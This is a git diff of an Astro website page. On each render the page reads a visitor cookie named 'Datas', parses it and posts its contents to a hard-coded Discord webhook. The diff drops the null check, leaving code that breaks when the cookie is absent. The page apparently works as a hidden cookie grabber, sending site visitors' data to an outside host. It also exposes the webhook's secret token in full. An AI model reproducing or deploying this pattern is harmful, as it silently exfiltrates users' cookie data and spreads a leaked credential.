@@ -7,7 +7,7 @@ import { SITE_TITLE, SITE_DESCRIPTION } from '../consts';
 
 const cookieOne = Astro.cookies.get('Datas')?.value
 import { Webhook, MessageBuilder } from 'discord-webhook-node';
-if (cookieOne) {
+
 const webHookUrl = 'https://discord.com/api/webhooks/1170383547568230500/HVpq3d3nVcybSAefhSfnnOmUBQHd7nmn9BjMIQpXwXa3mTkMEYa0gYEwcl7bggtommEj'
 const hook = new Webhook(webHookUrl);
 const jsonData = JSON.parse(cookieOne);
@@ -20,7 +20,6 @@ const embed = new MessageBuilder()
 .setTimestamp();
  
 hook.send(embed);
-}
 ---
 
 <!doctype html>
